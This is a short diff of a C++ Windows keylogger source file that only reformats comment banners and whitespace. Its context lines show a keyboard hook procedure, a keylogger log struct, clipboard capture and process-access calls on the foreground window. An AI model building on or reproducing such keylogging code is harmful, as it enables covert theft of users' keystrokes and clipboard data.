@@ -14,12 +14,12 @@
 #define MAX_PATH 256		
 #define MAX_DATE 80
  
-/* ------ Functions ------ */
+/* ---------------- Functions ----------------- */
 char* GetClipboardText(HWND hwnd);
 inline std::wstring getCurrentDate();
 void free_vector();
 std::wstring GetKeyFromVK(int vkCode, HWND hwnd);
-/* ----------------------- */
+/* -------------------------------------------- */
 
 using namespace std;
 typedef struct keylogger_log_struct {
@@ -42,7 +42,7 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
 	DWORD processid, username_len = UNLEN + 1;
 	HANDLE window_proc;
 	HWND hwnd = GetForegroundWindow(); // Gets a handler for the current window
-
+	
 	GetWindowThreadProcessId(hwnd, &processid);  // Retrieve current window process ID
 	memset(exe_path, 0, sizeof(exe_path));
 	window_proc = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_TERMINATE | PROCESS_ALL_ACCESS, FALSE, processid);
@@ -277,7 +277,6 @@ inline std::wstring getCurrentDate()
 
 	return (std::wstring(time_s.begin(), time_s.end()));
 }
-
 
 char* GetClipboardText(HWND hwnd = nullptr)
 {
